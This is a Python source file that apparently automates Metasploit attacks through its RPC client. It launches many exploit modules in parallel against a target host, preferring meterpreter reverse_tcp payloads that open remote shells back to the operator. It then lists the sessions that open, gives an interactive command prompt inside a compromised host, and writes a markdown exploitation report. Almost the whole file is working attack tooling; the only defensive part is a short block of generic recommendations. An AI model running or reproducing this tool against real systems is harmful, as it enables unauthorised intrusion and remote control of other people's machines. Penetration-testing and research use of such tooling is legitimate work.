import time
from pymetasploit3.msfrpc import MsfRpcClient
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging.handlers
from colorama import Fore, Style, init
from rich.console import Console
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt
from rich.table import Table
from rich.live import Live
from rich.layout import Layout
import matplotlib.pyplot as plt

console = Console()

# Set up logging with rotation
log_handler = logging.handlers.RotatingFileHandler('exploit.log', maxBytes=5*1024*1024, backupCount=2)

# Initialize colorama
init(autoreset=True)

# Configure logging
logging.basicConfig(level=logging.WARNING, handlers=[log_handler],format='%(asctime)s - %(levelname)s - %(message)s')


def choose_exploit_auto_run_non_verbose(client, exploits, rhosts, lhost, lport, max_retries=3, max_workers=5):
    exploit_results = {}
    successful_exploits = set()
    total_exploits = len(exploits)
    completed_exploits = 0
    payloads_used = {}

    logging.info("Starting exploit attempts...")

    def run_exploit(exploit_name, rhosts, lhost, lport, retries):
        for attempt in range(retries):
            try:
                logging.info(f"Attempt {attempt + 1} for exploit: {exploit_name}")
                exploit = exploit_name.split("exploit/")[1]
                module = client.modules.use('exploit', exploit)

                if not module:
                    logging.warning(f"Failed to load exploit module: {exploit_name}")
                    return (exploit_name, None)

                # Set options
                if 'RHOSTS' in module.options:
                    module['RHOSTS'] = rhosts
                if 'LHOST' in module.options:
                    module['LHOST'] = lhost
                if 'LPORT' in module.options:
                    module['LPORT'] = lport

                # Dynamic payload selection
                best_payload = select_best_payload(module.payloads)
                payloads_used[exploit_name] = best_payload
                if best_payload:
                    result = module.execute(payload=best_payload)
                    if result and result.get('job_id'):
                        return (exploit_name, result)
                else:
                    logging.warning(f"No suitable payload found for exploit: {exploit_name}")

            except Exception as e:
                logging.error(f"Error executing exploit {exploit_name}: {e}")

        logging.warning(f"All attempts failed for exploit: {exploit_name}")
        return (exploit_name, None)

    def select_best_payload(payloads):
        # Enhanced logic to select the best payload
        preferred_payloads = [
            'windows/meterpreter/reverse_tcp', 
            'linux/x86/meterpreter/reverse_tcp',
            'java/meterpreter/reverse_tcp'
        ]
        for payload in preferred_payloads:
            if payload in payloads:
                return payload
        return payloads[0] if payloads else None

    def show_progress(completed, total):
        percent = (completed / total) * 100
        bar_length = 50
        filled_length = int(bar_length * completed // total)
        bar = '=' * filled_length + '-' * (bar_length - filled_length)
        print(f"\rProgress: |{bar}| {percent:.2f}% Complete", end='\r')
        if completed == total:
            print()  # New line at the end of the progress bar

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_exploit = {
            executor.submit(run_exploit, exploit, rhosts, lhost, lport, max_retries): exploit 
            for exploit in exploits
        }

        for future in as_completed(future_to_exploit):
            exploit_name = future_to_exploit[future]
            try:
                exploit_name, result = future.result()
                completed_exploits += 1
                show_progress(completed_exploits, total_exploits)
                if exploit_name not in exploit_results:
                    exploit_results[exploit_name] = result
                if result:
                    successful_exploits.add(exploit_name)
            except Exception as e:
                logging.error(f"Unhandled exception for exploit {exploit_name}: {e}")
                completed_exploits += 1
                show_progress(completed_exploits, total_exploits)

    logging.info("Exploit attempts completed.")

    return exploit_results


def choose_exploit_auto_run_verbose(client, exploits, rhosts, lhost, lport, max_retries=3, max_workers=5):
    exploit_results = {}
    successful_exploits = set()
    total_exploits = len(exploits)
    completed_exploits = 0
    payloads_used = {}

    logging.info("Starting exploit attempts...")
    print(Fore.BLUE + "Initiating exploitation attempts...\n")

    def run_exploit(exploit_name, rhosts, lhost, lport, retries):
        for attempt in range(retries):
            try:
                logging.info(f"Attempt {attempt + 1} for exploit: {exploit_name}")
                exploit = exploit_name.split("exploit/")[1]
                module = client.modules.use('exploit', exploit)

                if not module:
                    logging.warning(f"Failed to load exploit module: {exploit_name}")
                    print(Fore.RED + f"Failed to load exploit module: {exploit_name}")
                    return (exploit_name, None)

                # Set options
                if 'RHOSTS' in module.options:
                    module['RHOSTS'] = rhosts
                if 'LHOST' in module.options:
                    module['LHOST'] = lhost
                if 'LPORT' in module.options:
                    module['LPORT'] = lport

                # Dynamic payload selection
                best_payload = select_best_payload(module.payloads)
                payloads_used[exploit_name] = best_payload
                if best_payload:
                    logging.info(f"Using payload: {best_payload}")
                    result = module.execute(payload=best_payload)
                    logging.info(f"Exploit result for {exploit_name}: {result}")
                    if result and result.get('job_id'):
                        print(Fore.GREEN + f"Successfully exploited: {exploit_name}")
                        return (exploit_name, result)
                    else:
                        logging.warning(f"Failed to execute payload for exploit: {exploit_name}")
                        print(Fore.RED + f"Failed to execute payload for exploit: {exploit_name}")
                else:
                    logging.warning(f"No suitable payload found for exploit: {exploit_name}")
                    print(Fore.RED + f"No suitable payload found for exploit: {exploit_name}")

            except Exception as e:
                logging.error(f"Error executing exploit {exploit_name}: {e}")
                print(Fore.RED + f"Error executing exploit {exploit_name}: {e}")

        logging.warning(f"All attempts failed for exploit: {exploit_name}")
        print(Fore.RED + f"All attempts failed for exploit: {exploit_name}")
        return (exploit_name, None)

    def select_best_payload(payloads):
        # Enhanced logic to select the best payload
        preferred_payloads = [
            'windows/meterpreter/reverse_tcp', 
            'linux/x86/meterpreter/reverse_tcp',
            'java/meterpreter/reverse_tcp'
        ]
        for payload in preferred_payloads:
            if payload in payloads:
                return payload
        return payloads[0] if payloads else None

    def show_progress(completed, total):
        percent = (completed / total) * 100
        bar_length = 50
        filled_length = int(bar_length * completed // total)
        bar = '=' * filled_length + '-' * (bar_length - filled_length)
        print(f"\rProgress: |{bar}| {percent:.2f}% Complete", end='\r')
        if completed == total:
            print()  # New line at the end of the progress bar

    print("\nChosen Payloads:\n")
    for exploit in exploits:
        best_payload = select_best_payload(client.modules.use('exploit', exploit.split("exploit/")[1]).payloads)
        payloads_used[exploit] = best_payload
        print(Fore.YELLOW + f"Using payload: {best_payload} for exploit: {exploit}")

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_exploit = {
            executor.submit(run_exploit, exploit, rhosts, lhost, lport, max_retries): exploit 
            for exploit in exploits
        }

        print("\nCurrently exploiting:\n")
        for future in as_completed(future_to_exploit):
            exploit_name = future_to_exploit[future]
            try:
                exploit_name, result = future.result()
                completed_exploits += 1
                show_progress(completed_exploits, total_exploits)
                print(Fore.YELLOW + f"\nCurrently exploiting: {exploit_name} {completed_exploits * 100 / total_exploits:.2f}% Complete")
                if exploit_name not in exploit_results:
                    exploit_results[exploit_name] = result
                if result:
                    successful_exploits.add(exploit_name)
            except Exception as e:
                logging.error(f"Unhandled exception for exploit {exploit_name}: {e}")
                print(Fore.RED + f"Unhandled exception for exploit {exploit_name}: {e}")
                completed_exploits += 1
                show_progress(completed_exploits, total_exploits)

    logging.info("Exploit attempts completed.")
    print(Fore.GREEN + "\nExploit attempts completed.")

    if successful_exploits:
        print(Fore.GREEN + "Successful exploits:")
    else:
        print(Fore.RED + "No successful exploits found.")

    for exploit in successful_exploits:
        print(Fore.GREEN + f"- {exploit}")

    print("\nDetailed exploit results:\n")
    for exploit, result in exploit_results.items():
        if result:
            job_id = result.get('job_id', 'N/A')
            uuid = result.get('uuid', 'N/A')
            print(Fore.CYAN + f"  - {exploit}:\n    Job ID: {job_id}\n    UUID: {uuid}")
        else:
            print(Fore.RED + f"  - {exploit}: Failed")

    return exploit_results

def handle_exploit_result1(exploit_result):
    return exploit_result and 'job_id' in exploit_result


def compare_exploit_counts(cve_exploits, service_name_exploits, service_name_version_exploits, criteria_exploits):
    try:
        # Calculate counts for each set of filtered exploit modules
        counts = {
            "CVE": len(cve_exploits),
            "Service Name": len(service_name_exploits),
            "Service Name & Version": len(service_name_version_exploits),
            "Combined Criteria": len(criteria_exploits)
        }

        # Remove counts with null values
        counts = {key: value for key, value in counts.items() if value > 0}

        if not counts:
            print("No exploit modules found for any filtering criteria.")
            return []

        # Find the function with the lowest count
        min_count_function = min(counts, key=counts.get)

        # Return the list of exploit modules from the function with the lowest count
        if min_count_function == "CVE":
           print("The minimum exploit is : CVE") 
           return cve_exploits
        elif min_count_function == "Service Name":
            print("The minimum exploit is : Service Name") 
            return service_name_exploits
        elif min_count_function == "Service Name & Version":
            print("The minimum exploit is : Service Name & Version") 
            return service_name_version_exploits
        else:
            print("The minimum is criteria exploits")
            return criteria_exploits
    except Exception as e:
        print(f"Error occurred while comparing exploit counts: {e}")
        return []



def open_session(client):
    try:
        successful_sessions = client.sessions.list
        if successful_sessions:
            table = Table(title="Successfully Created Sessions")
            table.add_column("Session ID", justify="center", style="cyan")
            table.add_column("Type", justify="center", style="cyan")
            table.add_column("Host", justify="center", style="cyan")
            table.add_column("Payload", justify="center", style="cyan")
            table.add_column("Module", justify="center", style="cyan")
            table.add_column("UUID", justify="center", style="cyan")

            for session_id, session_info in successful_sessions.items():
                if session_info['type'] == 'shell':
                    table.add_row(
                        session_id,
                        session_info['type'],
                        session_info['session_host'],
                        session_info['via_payload'],
                        session_info['via_exploit'],
                        session_info['uuid']
                    )

            console.print(table)

            while True:
                print("\n")
                chosen_session_id = Prompt.ask("Enter the Session ID you want to interact with")
                if chosen_session_id in successful_sessions:
                    session_info = successful_sessions[chosen_session_id]
                    if session_info['type'] == 'shell':
                        console.print("You are interacting with the session created by the module: {session_info['via_exploit']}")
                        interact_with_session(client.sessions.session(chosen_session_id))
                    else:
                        console.print("Selected session is not a shell session.")
                else:
                    console.print(Panel("Invalid Session ID. Please enter a valid Session ID.", style="red"))

                interact_again = Prompt.ask("Do you want to interact with another session? (y/n)")
                if interact_again.lower() != 'y':
                    break
        else:
            console.print(Panel("No successful shell sessions found.", style="red"))
    except Exception as e:
        console.print(Panel(f"Error occurred while retrieving successful sessions: {e}", style="red"))

def interact_with_session(session):
    console.print(Panel("Entering session. Type 'exit' to quit the session.", style="green"))
    while True:
        command = input(Fore.YELLOW+"Enter command >> ")
        if command.lower() == 'exit':
            break
        session.write(command)
        response = session.read()
        console.print(Panel(response, title="Session Output", style="white"))

    console.print(Panel("Exiting session.", style="green"))

def generate_report_en(client, service_exploits, md_filename='Final_result.md'):
    try:
        print("Exploitation Report:")
        print("-------------------")

        # Retrieve session list
        session_list = client.sessions.list

        # Identify successful exploits
        via_exploits = [session_info.get('via_exploit') for session_info in session_list.values()]

        # Counters for analysis
        total_exploits = 0
        successful_count = 0
        unsuccessful_count = 0

        # Open the Markdown file and prepare to write
        with open(md_filename, mode='w') as file:
            # Write the header of the Markdown file
            file.write("# Exploitation Report\n\n")
            file.write("-------------------\n\n")

            # Print and write information about the target host and services scanned
            target_host = "unknown"  # Placeholder if not available in session_list
            if session_list:
                # Attempt to get target host info if available
                target_host = next(iter(session_list.values())).get('target_host', 'unknown')

            services_scanned = list(service_exploits.keys())
            file.write(f"## Target Host: {target_host}\n\n")
            file.write("## Services Scanned:\n")
            print(f"Target Host: {target_host}")
            print("Services Scanned:")

            successful_exploits = []
            for via_exploit in via_exploits:
                if via_exploit:
                    successful_exploits.append(via_exploit)

            for service_name in services_scanned:
                exploits_for_service = service_exploits[service_name]
                if not exploits_for_service:  # Check if the service has any exploits
                    continue

                file.write(f"### Service Name: {service_name}\n")
                file.write("| Exploit Name | Result |\n")
                file.write("|--------------|--------|\n")
                print(f"- Service Name: {service_name}")
                print("  Exploits Attempted:")
                unique_exploits = set(exploits_for_service)  # Use a set to avoid duplicates
                for exploit_name in unique_exploits:
                    total_exploits += 1
                    result = "Successful" if exploit_name in successful_exploits else "Unsuccessful"
                    if result == "Successful":
                        successful_count += 1
                    else:
                        unsuccessful_count += 1
                    file.write(f"| {exploit_name} | {result} |\n")
                    print(f"    - {exploit_name}: {result}")

                file.write("\n-------------------\n\n")
                print("-------------------")

            # Separate successful exploits
            standard_exploits = ["exploit/" + exploit for exploits in service_exploits.values() for exploit in exploits]
            successful_exploits = [exploit.replace("exploit/", "") for exploit in standard_exploits if exploit in successful_exploits]
            unique_successful_exploits = set(successful_exploits)  # Use a set to avoid duplicates
            file.write("## Summary of Successful Exploits:\n")
            print("Summary of Successful Exploits:")
            for exploit in unique_successful_exploits:
                file.write(f"- {exploit}\n")
                print(f"- {exploit}")

            file.write("\n-------------------\n")

            # Analysis Section
            file.write("## Analysis\n")
            file.write(f"Total Exploits Attempted: {total_exploits}\n")
            file.write(f"Total Successful Exploits: {successful_count}\n")
            file.write(f"Total Unsuccessful Exploits: {unsuccessful_count}\n\n")

            # Generate and save the chart
            labels = ['Successful', 'Unsuccessful']
            sizes = [successful_count, unsuccessful_count]
            colors = ['#4CAF50', '#F44336']
            explode = (0.1, 0)  # explode the 1st slice

            plt.figure(figsize=(6, 6))
            plt.pie(sizes, explode=explode, labels=labels, colors=colors, autopct='%1.1f%%', shadow=True, startangle=140)
            plt.axis('equal')  # Equal aspect ratio ensures that pie is drawn as a circle.
            chart_filename = 'exploit_analysis_chart.png'
            plt.savefig(chart_filename)
            plt.close()

            # Reference the chart in the Markdown file
            file.write("![Exploit Analysis Chart](exploit_analysis_chart.png)\n\n")

            general_recommendations = (
                "1. Regularly update and patch all systems to mitigate known vulnerabilities.\n"
                "2. Use network segmentation and firewall rules to limit the spread of attacks.\n"
                "3. Implement intrusion detection and prevention systems (IDS/IPS) to detect and block malicious activities.\n"
                "4. Conduct regular security assessments and penetration tests to identify and remediate vulnerabilities.\n"
                "5. Educate employees on cybersecurity best practices to prevent social engineering attacks.\n"
            )

            file.write("### General Recommendations:\n")
            file.write(general_recommendations)

            print("## Analysis")
            print(f"Total Exploits Attempted: {total_exploits}")
            print(f"Total Successful Exploits: {successful_count}")
            print(f"Total Unsuccessful Exploits: {unsuccessful_count}")
            print("\nGeneral Recommendations:")
            print(general_recommendations)

    except Exception as e:
        print("Error occurred while generating the report:", e)

def close_all_sessions(client):
    """
    Closes all currently open sessions.
    
    Parameters:
        client (MsfRpcClient): The client object used to communicate with the Metasploit RPC server.
    
    Returns:
        None
    """
    try:
        # Get a list of all active sessions
        active_sessions = client.sessions.list
        if active_sessions:
            print("Closing all active sessions...")
            # Close each active session
            for session_id in active_sessions.keys():
                client.sessions.session(session_id).stop()
            print("All sessions closed successfully.")
        else:
            print("No active sessions found to close.")
    except Exception as e:
        print("Error occurred while closing sessions:", e)


def send_scripts(client):
    print("The auto send scripts is coming soon...so stay updated :)")
